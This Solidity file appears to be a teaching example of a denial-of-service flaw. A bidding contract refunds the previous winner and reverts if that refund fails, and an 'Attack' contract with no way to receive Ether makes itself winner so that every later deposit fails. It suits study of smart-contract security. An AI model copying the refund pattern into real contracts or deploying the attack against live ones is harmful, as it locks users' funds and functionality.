// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.24;

contract Dos {
    address public winner;
    uint public balance;

    function deposit() public payable {
        require(msg.value > balance, "Deposit more funds than you currently have on deposit.");

        // return the balance to the previous winner
        (bool sent, ) = winner.call{value: balance}("");
        require(sent, "Failed to send Ether");

        // update the winner and its balance
        balance = msg.value;
        winner = msg.sender;
    }
}

contract Attack {
    Dos dos;

    constructor (Dos _dos) {
        dos = Dos(_dos);
    }

    function attack() public payable {
        dos.deposit{value: msg.value}();
    }
}
